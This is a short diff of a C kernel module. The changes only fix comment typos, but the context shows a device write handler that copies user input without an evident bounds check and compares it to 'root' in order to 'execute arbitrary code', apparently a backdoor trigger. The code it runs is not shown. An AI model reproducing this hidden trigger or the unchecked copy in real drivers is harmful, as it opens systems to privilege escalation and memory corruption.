@@ -35,7 +35,7 @@ ssize_t read(struct file *filp, char __user *buf, size_t count,
 ssize_t write(struct file *filp, const char __user *buf, size_t count, loff_t *offset)
 {
     /**
-     * Copy thee user sended message
+     * Copy the user sended message
      * ex: echo "root" > /dev/tty8
      * */
     if (copy_from_user(secret_message, buf, count))
@@ -47,7 +47,7 @@ ssize_t write(struct file *filp, const char __user *buf, size_t count, loff_t *o
     /**
      * Compare the message
      * If the message is equal to "root" then
-     * exectute arbitrari code
+     * exectute arbitrary code
      * */
     if (0 == strncmp(secret_message, "root\n", 4))
     {
